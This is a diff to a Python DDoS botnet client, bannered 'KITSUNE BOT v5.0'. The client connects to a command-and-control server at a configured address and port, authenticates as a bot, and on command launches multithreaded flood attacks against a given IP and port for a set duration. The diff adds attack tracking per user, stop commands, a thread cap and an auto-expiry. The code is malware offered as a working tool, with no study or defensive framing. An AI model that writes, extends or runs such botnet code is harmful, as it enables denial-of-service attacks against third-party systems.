@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import subprocess, random, os, time, threading, socket, uuid, struct, sys, codecs
+import subprocess, random, os, time, threading, socket, uuid, struct, sys, codecs, re
 
 # ─── CONFIGURACIÓN DE ENCODING ──────────────────────────────────────────────────
 if sys.stdout.encoding != 'UTF-8':
@@ -14,7 +14,6 @@ C2_PORT = 55064
 
 # ─── FUNCIONES SEGURAS ──────────────────────────────────────────────────────────
 def safe_recv(sock, size=1024, timeout=10):
-    """Recibe datos con timeout y manejo de errores"""
     try:
         sock.settimeout(timeout)
         data = sock.recv(size)
@@ -23,27 +22,27 @@ def safe_recv(sock, size=1024, timeout=10):
         return data.decode('utf-8', errors='ignore')
     except socket.timeout:
         return ""
-    except Exception as e:
-        print(f"[!] Recv error: {e}")
+    except Exception:
         return ""
 
 def safe_send(sock, data):
-    """Envía datos de forma segura"""
     try:
         if isinstance(data, str):
             sock.send(data.encode('utf-8', errors='ignore'))
         else:
             sock.send(data)
         return True
-    except Exception as e:
-        print(f"[!] Send error: {e}")
+    except Exception:
         return False
 
 # ─── UTILIDADES ──────────────────────────────────────────────────────────────
 def get_architecture():
     try:
         result = subprocess.check_output(['uname', '-m'], stderr=subprocess.DEVNULL)
-        return result.decode().strip()
+        arch = result.decode().strip()
+        # Limpiar caracteres extraños
+        arch = re.sub(r'[^a-zA-Z0-9_\-]', '', arch)
+        return arch if arch else 'unknown'
     except:
         return 'unknown'
 
@@ -59,6 +58,10 @@ def get_bot_id():
         except:
             pass
         return bot_id
+
+# ─── VARIABLES GLOBALES ──────────────────────────────────────────────────────
+user_attacks = {}  # username -> list of (stop_event, thread_count, method, ip, port, duration)
+active_attacks = {}  # attack_id -> stop_event
 
 # ─── MÉTODOS DE ATAQUE ──────────────────────────────────────────────────────
 PACKET_SIZES = [1024, 2048, 4096, 8192]
@@ -134,11 +137,37 @@ def lunch_attack(method, ip, port, secs, stop_event):
 def start_attack(method, ip, port, duration, thread_count, username):
     stop_event = threading.Event()
     end_time = time.time() + duration
+    attack_id = f"{username}_{int(time.time())}"
+    
+    active_attacks[attack_id] = stop_event
+    
     for _ in range(thread_count):
         threading.Thread(target=lunch_attack, args=(method, ip, port, end_time, stop_event), daemon=True).start()
 
+    if username not in user_attacks:
+        user_attacks[username] = []
+    user_attacks[username].append((attack_id, stop_event, thread_count, method, ip, port, duration))
+    
+    # Auto-remover después de la duración
+    threading.Thread(target=lambda: remove_attack_after(attack_id, duration), daemon=True).start()
+    
+    return attack_id
+
+def remove_attack_after(attack_id, duration):
+    time.sleep(duration)
+    if attack_id in active_attacks:
+        stop_event = active_attacks[attack_id]
+        stop_event.set()
+        del active_attacks[attack_id]
+
 def stop_attacks(username):
-    print(f"[+] Attacks stopped for {username}")
+    if username in user_attacks:
+        for attack_id, stop_event, _, _, _, _, _ in user_attacks[username]:
+            stop_event.set()
+            if attack_id in active_attacks:
+                del active_attacks[attack_id]
+        user_attacks[username].clear()
+        print(f"[+] Attacks stopped for {username}")
 
 # ─── MAIN ────────────────────────────────────────────────────────────────────
 
@@ -159,8 +188,6 @@ def main():
             c2.connect((C2_ADDRESS, C2_PORT))
             print("[+] Connected!")
 
-            # ─── AUTENTICACIÓN MEJORADA ───
-            # Esperar y leer todo lo que llegue hasta encontrar el prompt de Username
             auth_step = 0
             buffer = ""
             
@@ -171,21 +198,18 @@ def main():
                     continue
                 
                 buffer += data
-                print(f"[DEBUG] Received: {data[:100]}...")
                 
-                # Buscar prompts en el buffer
                 if 'Username' in buffer or '❯' in buffer:
                     if auth_step == 0:
                         safe_send(c2, f"{arch}|{bot_id}\n")
                         print(f"[*] Sent: {arch}|{bot_id}")
                         auth_step = 1
-                        buffer = ""  # Limpiar buffer
+                        buffer = ""
                 
                 if 'Password' in buffer:
                     if auth_step == 1:
-                        # Enviar contraseña de bot
-                        safe_send(c2, '\xff\xff\xff\xff\75\n')
-                        print("[*] Sent bot password")
+                        safe_send(c2, 'BOT_PASSWORD\n')
+                        print("[*] Sent bot password (BOT_PASSWORD)")
                         auth_step = 2
                         buffer = ""
             
@@ -195,7 +219,6 @@ def main():
             print('✅ Authenticated as BOT!')
             backoff = 1
             
-            # ─── BUCLE PRINCIPAL ───
             last_heartbeat = time.time()
             while True:
                 data = safe_recv(c2, 1024, 60)
@@ -214,16 +237,23 @@ def main():
                 if command == 'PING':
                     safe_send(c2, 'PONG\n')
                 elif command == 'STOP':
-                    stop_attacks(args[1] if len(args) > 1 else "default")
+                    if len(args) > 1:
+                        stop_attacks(args[1])
+                    else:
+                        stop_attacks("default")
                 elif command.startswith('.'):
                     try:
                         method = command
                         ip = args[1]
                         port = int(args[2])
                         secs = int(args[3])
-                        threads_atk = int(args[4]) if len(args) >= 5 else 5
+                        threads_atk = int(args[4]) if len(args) >= 5 else 1
                         username_atk = args[5] if len(args) >= 6 else "default"
-                        print(f"[*] Attacking {ip}:{port} with {method} ({threads_atk} threads)")
+                        # Limitar concurrentes a 5
+                        if threads_atk > 5:
+                            threads_atk = 5
+                            print(f"[*] Limitando concurrentes a 5")
+                        print(f"[*] Attacking {ip}:{port} with {method} ({threads_atk} concurrentes)")
                         start_attack(method, ip, port, secs, threads_atk, username_atk)
                     except Exception as e:
                         print(f"Error: {e}")
@@ -246,7 +276,7 @@ def main():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════╗
-    ║         NEXUS BOT - v4.0              ║
+    ║         KITSUNE BOT - v5.0            ║
     ║         DDoS Bot Client               ║
     ╚═══════════════════════════════════════╝
     """)
